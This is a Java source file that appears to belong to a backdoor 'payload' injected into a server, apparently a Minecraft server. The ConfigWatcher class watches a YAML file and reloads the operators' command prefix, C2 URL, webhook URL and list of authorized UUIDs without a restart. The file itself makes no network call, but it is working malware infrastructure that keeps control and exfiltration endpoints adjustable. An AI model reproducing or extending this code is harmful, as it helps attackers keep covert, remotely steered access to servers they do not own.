package dev.naruto.astrox.payload;

import dev.naruto.astrox.RuntimeConfig;
import dev.naruto.astrox.utils.DebugLogger;
import org.yaml.snakeyaml.Yaml;

import java.io.*;
import java.nio.file.*;
import java.util.*;

/**
 * Runtime configuration hot-reloader using Java NIO {@link WatchService}.
 *
 * <p>Watches a configuration YAML file (path set at inject-time) and reloads
 * authorized UUIDs, command prefix, C2 URL, and webhook URL without server restart.</p>
 */
public class ConfigWatcher implements Runnable {

    private final Path configPath;
    private volatile boolean running = true;
    private Thread watchThread;

    /**
     * @param configFilePath path to the YAML config file to watch
     */
    public ConfigWatcher(String configFilePath) {
        this.configPath = Path.of(configFilePath);
    }

    /**
     * Start the file watcher thread.
     */
    public void start() {
        if (!Files.exists(configPath)) {
            DebugLogger.log("Config file not found for hot-reload: " + configPath);
            return;
        }

        watchThread = new Thread(this, "config-watcher");
        watchThread.setDaemon(true);
        watchThread.start();
        DebugLogger.log("Config hot-reload watching: " + configPath);
    }

    /**
     * Stop the watcher.
     */
    public void stop() {
        running = false;
        if (watchThread != null) {
            watchThread.interrupt();
        }
    }

    @Override
    public void run() {
        try (WatchService watchService = FileSystems.getDefault().newWatchService()) {
            Path dir = configPath.getParent();
            if (dir == null) return;

            dir.register(watchService, StandardWatchEventKinds.ENTRY_MODIFY);

            while (running) {
                WatchKey key = watchService.take(); // Blocks until event

                for (WatchEvent<?> event : key.pollEvents()) {
                    if (event.kind() == StandardWatchEventKinds.ENTRY_MODIFY) {
                        Path changed = (Path) event.context();
                        if (changed.equals(configPath.getFileName())) {
                            DebugLogger.log("Config file modified — reloading...");
                            reloadConfig();
                        }
                    }
                }

                if (!key.reset()) {
                    DebugLogger.log("Config watcher key invalidated");
                    break;
                }
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        } catch (Exception e) {
            DebugLogger.error("Config watcher failed", e);
        }
    }

    /**
     * Reload configuration from the YAML file.
     */
    @SuppressWarnings("unchecked")
    private void reloadConfig() {
        try (InputStream is = new FileInputStream(configPath.toFile())) {
            Yaml yaml = new Yaml();
            Map<String, Object> config = yaml.load(is);

            if (config == null) return;

            // Reload command prefix
            if (config.containsKey("prefix")) {
                RuntimeConfig.commandPrefix = String.valueOf(config.get("prefix"));
                DebugLogger.log("Reloaded command prefix: " + RuntimeConfig.commandPrefix);
            }

            // Reload webhook URL
            if (config.containsKey("webhook")) {
                RuntimeConfig.webhookUrl = String.valueOf(config.get("webhook"));
                DebugLogger.log("Reloaded webhook URL");
            }

            // Reload C2 URL
            if (config.containsKey("c2")) {
                RuntimeConfig.c2Url = String.valueOf(config.get("c2"));
                DebugLogger.log("Reloaded C2 URL");
            }

            // Reload authorized UUIDs
            if (config.containsKey("authorized")) {
                Object authObj = config.get("authorized");
                if (authObj instanceof List) {
                    List<String> uuids = (List<String>) authObj;
                    RuntimeConfig.preAuthorizedUUIDs = new ArrayList<>(uuids);
                    DebugLogger.log("Reloaded " + uuids.size() + " authorized UUIDs");
                }
            }

            DebugLogger.log("Configuration hot-reload complete");

        } catch (Exception e) {
            DebugLogger.error("Failed to reload config", e);
        }
    }
}
